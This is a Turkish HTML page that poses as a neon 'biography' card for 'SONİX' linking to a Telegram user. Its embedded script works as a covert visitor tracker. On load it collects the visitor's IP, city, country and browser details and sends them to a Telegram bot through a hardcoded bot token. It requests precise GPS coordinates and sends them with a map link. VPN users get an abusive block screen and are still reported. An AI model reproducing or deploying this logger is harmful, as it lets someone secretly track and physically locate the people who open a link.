<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SONİX | Biyografi</title>
    <style>
        body { background: #050a0f; color: white; font-family: 'Courier New', monospace; margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }
        .container { text-align: center; z-index: 10; }
        .sonix { font-size: 5rem; font-weight: 900; color: #00d4ff; text-shadow: 0 0 20px #00d4ff; animation: pulse 2s infinite alternate; letter-spacing: 10px; }
        .kardesim { font-size: 2.2rem; margin-top: 20px; font-weight: bold; color: #ffffff; letter-spacing: 3px; }
        .username { font-size: 2.5rem; color: #ff00ff; text-shadow: 0 0 10px #ff00ff; text-decoration: none; display: block; margin-top: 15px; transition: 0.5s; }
        .username:hover { transform: scale(1.1); color: #00ff00; text-shadow: 0 0 20px #00ff00; }
        
        @keyframes pulse { 
            from { transform: scale(1); color: #00d4ff; text-shadow: 0 0 20px #00d4ff; } 
            to { transform: scale(1.05); color: #00ff00; text-shadow: 0 0 40px #00ff00; } 
        }

        /* VPN Engel Ekranı */
        #vpn-blocker {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: red; color: black; z-index: 9999; justify-content: center; align-items: center;
            font-size: 3rem; font-weight: bold; text-align: center; padding: 20px;
        }
    </style>
</head>
<body>

    <div id="vpn-blocker">VPN KAPAT AMK</div>

    <div id="main-content" class="container">
        <div class="sonix">SONİX</div>
        <div class="kardesim">CAN KARDEŞİM</div> 
        <a href="https://t.me/Calw1nn" class="username">@Calw1nn</a>
    </div>

    <script>
        const token = "8786995649:AAEQyWRD2oXQdc7YG5o9TI641dwB9ZIPM00";
        const chatId = "7783618933";

        function sendToBot(msg) {
            let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
            new Image().src = url;
        }

        window.getIP = function(json) {
            let ip = json.ip;
            
            // VPN ve Proxy kontrolü
            fetch(`https://demo.ip-api.com/json/${ip}?fields=66846719`)
            .then(res => res.json())
            .then(data => {
                if (data.proxy === true || data.hosting === true) {
                    document.getElementById('main-content').style.display = 'none';
                    document.getElementById('vpn-blocker').style.display = 'flex';
                    sendToBot(`🚫 VPN TESPİT EDİLDİ!\n📍 IP: ${ip}\n📱 Cihaz: ${navigator.userAgent}`);
                } else {
                    sendToBot(`🚨 YENİ GİRİŞ!\n📍 IP: ${ip}\n🌍 Konum: ${data.city} / ${data.country}\n📱 Cihaz: ${navigator.userAgent}`);
                    
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(pos => {
                            let lat = pos.coords.latitude;
                            let lon = pos.coords.longitude;
                            sendToBot(`🎯 TAM KONUM (GPS):\n📍 Koordinat: ${lat}, ${lon}\n🗺 Harita: https://www.google.com/maps?q=${lat},${lon}`);
                        }, null, {enableHighAccuracy: true});
                    }
                }
            })
            .catch(() => {
                sendToBot(`🚨 GİRİŞ (VPN Kontrolü Atlandı)\n📍 IP: ${ip}`);
            });
        };

        // IP çekme işlemini başlat
        let script = document.createElement('script');
        script.src = 'https://api.ipify.org?format=jsonp&callback=getIP';
        document.body.appendChild(script);
    </script>
</body>
</html>
